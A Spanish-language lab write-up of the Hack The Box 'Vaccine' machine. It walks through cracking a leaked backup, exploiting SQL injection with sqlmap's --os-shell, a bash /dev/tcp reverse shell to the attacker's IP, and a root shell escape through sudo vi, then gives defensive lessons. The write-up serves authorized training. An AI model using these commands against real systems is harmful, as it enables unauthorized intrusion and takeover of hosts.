---
title: Vaccine (HTB Starting Point)
date: 2026-06-15
tags: [ciberseguridad, htb, starting-point, pentesting, ftp, sqli, sqlmap, john, gtfobins, sudo, privesc, linux]
type: nota
status: en-progreso
source: claude-code
aliases: [Vaccine HTB, HTB Vaccine, vaccine starting point]
---

# Vaccine — HTB Starting Point (Tier 2)

Tier 2 · SO: Linux · Dificultad: Very Easy · Skills: FTP anónimo, cracking de ZIP, SQL Injection con sqlmap, sudo + GTFOBins

Máquina que encadena tres patrones clásicos: credenciales filtradas en backup → inyección SQL con ejecución de comandos → escalada por configuración laxa de sudo. Cada paso desbloquea el siguiente: sin las credenciales no hay panel web, sin SQLi no hay shell, sin sudo mal configurado no hay root.

> HTB Starting Point es un laboratorio legal y autorizado por Hack The Box. Todo lo aquí descrito se aplica exclusivamente en ese entorno controlado.

---

## Objetivo

Obtener acceso inicial aprovechando credenciales filtradas en un backup expuesto por FTP y una SQL Injection en el panel web. Escalar a root explotando un permiso de sudo mal restringido sobre un editor de texto.

---

## Acceso a la maquina (paso previo)

Antes de atacar nada necesitas conectarte a la red de HTB y arrancar la maquina para obtener su **IP**:

1. **Descarga tu VPN** desde el panel de HTB (Starting Point -> *Connect* -> descarga el `.ovpn`).
2. **Conectate a la VPN** y dejala corriendo en una terminal aparte:
   ```bash
   sudo openvpn starting_point_<tu_usuario>.ovpn
   ```
3. **Lanza la maquina** en la web (boton *Spawn Machine*). HTB te dara una **IP** (tipo `10.129.x.x`).
4. Comprueba que llegas a ella:
   ```bash
   ping -c2 <IP>
   ```
5. En el resto de este writeup, **sustituye `<IP>` por la IP que te toque** (es dinamica: cambia cada vez que lanzas la maquina).

> Alternativa sin VPN: el **Pwnbox** (Kali en el navegador que ofrece HTB) ya viene conectado a la red; solo lanzas la maquina y usas su IP directamente.

## Reconocimiento

Categoría: escaneo de puertos y detección de servicios.

```bash
nmap -sV -sC -p- --min-rate 5000 <IP>
```

Puertos relevantes que suele revelar:

| Puerto | Servicio | Detalle |
|--------|----------|---------|
| 21/tcp | FTP | vsftpd — acceso anónimo habilitado |
| 22/tcp | SSH | OpenSSH |
| 80/tcp | HTTP | Apache — panel web PHP |

El FTP con login anónimo es la pista de entrada: cualquier archivo disponible ahí es información filtrada por diseño.

---

## Enumeración

### FTP anónimo

Categoría: credenciales filtradas / backup expuesto.

```bash
ftp <IP>
# Usuario: anonymous   Contraseña: (vacía o cualquier string)
ls
get backup.zip
bye
```

El archivo `backup.zip` está protegido con contraseña. El siguiente paso es crackearlo.

### Cracking del ZIP con John

```bash
zip2john backup.zip > backup.hash
john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash
```

`zip2john` extrae el hash de autenticación del ZIP y `john` lo ataca por diccionario. La contraseña obtenida permite descomprimir el archivo. Ajusta la ruta de `rockyou.txt` según tu sistema (en Kali suele estar comprimido: `gunzip /usr/share/wordlists/rockyou.txt.gz`).

```bash
unzip -P <contraseña_crackeada> backup.zip
```

Dentro del ZIP hay archivos de configuración del panel web (típicamente `index.php` o similar) con credenciales hardcoded en forma de hash MD5.

### Cracking del hash MD5

```bash
# Opción A — John
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Opción B — hashcat
hashcat -m 0 <hash_md5> /usr/share/wordlists/rockyou.txt

# Opción C — crackstation.net (online, útil para hashes comunes)
```

Con la contraseña en claro ya puedes autenticarte en el panel web en `http://<IP>/`.

---

## Acceso inicial (foothold)

### SQL Injection → RCE → Reverse shell

Categoría: inyección SQL con capacidad de escritura en disco (INTO OUTFILE / `--os-shell`).

Una vez dentro del panel, hay un campo de búsqueda vulnerable a SQLi. Captura la petición autenticada (con Burp o desde el navegador → inspeccionar red) para obtener el valor de la cookie de sesión, necesaria para que sqlmap se autentique.

```bash
sqlmap -u "http://<IP>/dashboard.php?search=x" \
  --cookie="PHPSESSID=<tu_cookie>" \
  --os-shell
```

`--os-shell` intenta escribir un webshell en el servidor y ofrecerte una pseudo-shell interactiva. Si el usuario de la base de datos tiene privilegio `FILE` y el servidor web es escribible, sqlmap automatiza todo el proceso.

Desde la os-shell, lanza una reverse shell hacia tu máquina:

```bash
# En tu máquina — escucha
nc -lvnp 4444

# En la os-shell de sqlmap
bash -c 'bash -i >& /dev/tcp/<TU_IP>/4444 0>&1'
```

Ahora tienes una shell como el usuario del servicio web (p. ej. `www-data` o `postgres`). Estabiliza la shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Escalada de privilegios

Categoría: sudo mal configurado + GTFOBins (editor de texto).

```bash
sudo -l
```

La salida mostrará algo similar a:

```
(root) NOPASSWD: /bin/vi /etc/postgresql/<version>/main/pg_hba.conf
```

El permiso permite ejecutar `vi` como root sobre un fichero concreto. GTFOBins documenta que cualquier editor interactivo con sudo puede escapar a una shell root:

```bash
sudo vi /etc/postgresql/<version>/main/pg_hba.conf
```

Dentro de vi:

```
:set shell=/bin/sh
:shell
```

O directamente:

```
:!/bin/sh
```

Ahora eres root. La ruta exacta del fichero puede variar según la versión de PostgreSQL instalada; compruébala en vivo con `sudo -l` o explorando `/etc/postgresql/`.

---

## Flags

Las máquinas de Tier 2 suelen tener dos flags:

| Flag | Ubicación típica | Cómo llegar |
|------|-----------------|-------------|
| `user.txt` | `/home/<usuario>/user.txt` | Shell como www-data/postgres tras el foothold |
| `root.txt` | `/root/root.txt` | Shell root tras GTFOBins |

```bash
# User flag
find / -name user.txt 2>/dev/null

# Root flag (tras privesc)
cat /root/root.txt
```

Introduce cada valor `<flag>` en la interfaz de HTB para validarlo.

---

## Patron y teoria

Esta es la sección más importante: los patrones que se repiten y cómo diseñar/defender para evitarlos.

### Patrón 1 — Backup expuesto con secretos en texto claro (o hash débil)

**Qué ocurre:** un archivo de backup accesible públicamente (FTP anónimo, S3 público, directorio web sin restricción) contiene credenciales. El hash MD5 sin sal se rompe en segundos con rockyou.

**Cómo se defiende (dev/ops):**
- Nunca exponer directorios de backup en servicios de acceso público.
- FTP anónimo solo para datos verdaderamente públicos y sin valor. Preferir SFTP con autenticación.
- Nunca guardar contraseñas como MD5 o SHA1 sin sal. Usar bcrypt / argon2id con factor de coste adecuado.
- Rotar credenciales si un backup sale de la infraestructura controlada.

### Patrón 2 — SQL Injection con FILE privilege → RCE

**Qué ocurre:** la aplicación concatena input del usuario en una query SQL sin parametrizar. El usuario de BD tiene privilegio `FILE`, lo que permite escribir archivos en disco. sqlmap automatiza la explotación hasta obtener ejecución de comandos.

**Cómo se defiende (dev):**
- Siempre usar **consultas parametrizadas** (prepared statements) o un ORM que las genere.
- Principio de mínimo privilegio en la BD: el usuario de la app solo necesita SELECT/INSERT/UPDATE sobre sus tablas, nunca FILE ni SUPER.
- WAF como capa adicional, no como única defensa (sqlmap tiene decenas de técnicas de bypass).
- Revisar OWASP Top 10 A03:2021 — Injection.

```python
# MAL — vulnerable
query = f"SELECT * FROM products WHERE name = '{search}'"

# BIEN — parametrizado
cursor.execute("SELECT * FROM products WHERE name = %s", (search,))
```

### Patrón 3 — sudo irrestricto sobre herramientas interactivas (GTFOBins)

**Qué ocurre:** `sudo -l` revela que un usuario de bajo privilegio puede ejecutar como root un editor de texto (`vi`, `vim`, `nano`, `less`…). Estos programas permiten invocar shells desde dentro, escapando al contexto root.

**Cómo se defiende (sysadmin/dev):**
- Principio de mínimo privilegio en sudo: si necesitas editar un fichero de config, usa `sudoedit` (que no abre una shell interactiva) en lugar de `sudo vi`.
- Audita `/etc/sudoers` regularmente. Cualquier entrada con un editor o intérprete (python, perl, awk…) es un vector.
- Consulta GTFOBins antes de dar cualquier permiso de sudo: si el binario aparece ahí, no lo pongas en sudoers sin restricciones muy fuertes.
- Considera herramientas como `auditd` para loggear invocaciones de sudo.

### Cadena completa (kill chain)

```
FTP anónimo → backup.zip crackeado → credenciales MD5 crackeadas
→ login panel web → SQLi sin parametrizar → sqlmap os-shell
→ reverse shell (www-data/postgres) → sudo -l → vi + GTFOBins → root
```

Cada eslabón falla si el anterior se mitiga: sin el backup expuesto no hay credenciales; sin SQLi no hay RCE; sin sudo mal configurado no hay root.

---

## Conexiones

- [[HTB_Starting_Point/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- [[13-herramientas-en-detalle]] — sqlmap, john, nmap, netcat
- [[06-seguridad-de-sistemas-y-hardening]] — sudo, sudoers, principio de mínimo privilegio

### Referencias externas

- [GTFOBins — vi](https://gtfobins.github.io/gtfobins/vi/)
- [OWASP Top 10 A03 — Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [sqlmap docs](https://sqlmap.org/)
- [zip2john / John the Ripper](https://www.openwall.com/john/)
